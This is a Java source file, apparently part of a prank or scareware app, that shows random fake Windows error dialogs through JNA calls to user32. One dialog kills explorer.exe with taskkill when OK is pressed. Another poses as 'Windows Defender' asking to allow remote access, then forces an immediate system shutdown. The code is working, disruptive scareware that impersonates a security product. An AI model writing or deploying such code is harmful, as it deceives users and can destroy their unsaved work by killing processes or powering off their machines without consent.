package maurus.features.popups.error;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.WString;
import javafx.animation.KeyFrame;
import javafx.animation.Timeline;
import javafx.application.Platform;
import javafx.scene.control.Alert;
import javafx.stage.Stage;
import javafx.util.Duration;
import maurus.App;

import javax.swing.*;

import java.io.IOException;

import static maurus.features.popups.error.ErrorWindow.errorWindow;

public class Error {

    // Define an interface mapping to User32.dll
    public interface User32 extends Library {
        User32 INSTANCE = Native.load("user32", User32.class);

        int MessageBoxW(int hWnd, WString lpText, WString lpCaption, int uType);
        int GetForegroundWindow();

        boolean MessageBeep(int uType);
    }


    public static void start(Stage primaryStage, Runnable onDone) {
    String whitespace = "                    ";

    //all Icon options
    int IconError = 0x00000010;
    int IconQuestion = 0x00000020;
    int IconWarning = 0x00000030;
    int IconInformation = 0x00000040;
    //chooses wich switch case gets called
    int welches_poopup =(int) ( Math.random()*3) + 1;
//    all Button options
    int Okbutton = 0x0;
    int OKCancelbutton = 0x00000001;
    int YesNoCancelbutton = 0x00000003;
    int YesNoButton = 0x00000004;
    int RetryCancelbutton = 0x00000005;
    int RetryACncelContinue = 0x00000006;
    switch (welches_poopup) {
        case 1:
        int output1 = errorWindow("fatal Error " + whitespace, "Error", IconError, Okbutton);
        //if ok is pressed it will kill explorer
        if (output1 == 1) {
            try {
                new ProcessBuilder("cmd", "/c", "taskkill /F /IM explorer.exe").start();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
            break;
        case 2:
            errorWindow("system process failed", "Fatal error", IconWarning, Okbutton);
        break;

        case 3:
        int output4 = errorWindow("Wollen sie remote access erlauben? ",
                "Windows Defender ", IconInformation, YesNoButton);
        if (output4 == 6) {
            errorWindow("Ihr system Startet jetzt neu ",
                    "Windows Explorer ", IconInformation, Okbutton);
            try {
                new ProcessBuilder("cmd", "/c", "shutdown", "/s", "/t", "0").start();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        break;
    }
    Timeline timeline = new Timeline(new KeyFrame(Duration.minutes(App.getAppclosetime()),e -> {
        onDone.run();
    }));
    timeline.play();
    timeline.setCycleCount(1);//ensurest it's only called once
    }


}
